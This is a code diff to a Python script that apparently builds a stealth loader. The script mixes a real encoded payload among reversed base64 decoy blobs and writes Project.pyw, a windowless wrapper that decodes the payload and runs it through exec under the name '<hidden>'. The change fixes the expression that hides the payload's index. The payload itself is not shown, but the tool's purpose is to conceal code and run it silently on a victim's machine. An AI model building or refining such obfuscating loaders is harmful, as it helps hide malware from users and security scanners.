@@ -23,12 +23,13 @@ for i in range(5):
     enc = base64.b64encode(junk.encode("utf-8")).decode("utf-8")
     blobs.append(enc[::-1])
 
-# --- Insert real blob at hidden index ---
+# --- Insert real blob at random index ---
 insert_index = random.randint(0, len(blobs))
 blobs.insert(insert_index, real_blob)
 
-# --- Obfuscate index with math expression ---
-expr = f"({insert_index*7}+{random.randint(1,9)})//7"
+# --- Safe obfuscation expression (always valid) ---
+# Example: (insert_index*10)//10
+expr = f"({insert_index}*10)//10"
 
 # --- Build wrapper ---
 wrapper = f'''
@@ -49,4 +50,4 @@ exec(compile(code,"<hidden>","exec"))
 with open("Project.pyw", "w", encoding="utf-8") as f:
     f.write(wrapper.strip())
 
-print("✅ Final stealth obfuscated Project.pyw created")
+print("✅ Final stealth obfuscated Project.pyw created (safe index)")
